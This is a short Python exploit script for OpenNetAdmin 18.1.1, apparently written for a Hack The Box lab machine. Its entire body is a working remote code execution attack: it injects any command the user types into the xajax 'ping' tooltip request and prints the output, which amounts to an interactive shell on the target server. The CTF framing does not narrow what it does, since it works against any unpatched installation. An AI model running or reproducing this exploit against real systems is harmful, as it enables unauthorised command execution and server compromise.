#!/usr/bin/python3
# a simple script, meant to get the 1st initial shell on openAdmin machine from HTB
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Origin exploit @mattpascoe
# python version @m3dsec
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1

import requests
import json
import re
import sys

if len(sys.argv) != 2:
	print("USAGE : python3 exploit.py URL")
	#print("USAGE : python3 exploit.py http://10.10.10.171/ona/")
	exit()

url = sys.argv[1]
while True:
	try:
		userCmd = input('$ ')
		headers = {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded"}
		data1 = "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo 'BEGIN';{};echo 'END'&xajaxargs[]=ping".format(userCmd)
		r = requests.post(url, data=data1, headers=headers)
		result = re.search(r"BEGIN(.*)END", r.text, re.S)
		print(result.group(1))
	except KeyboardInterrupt:
		exit(0)

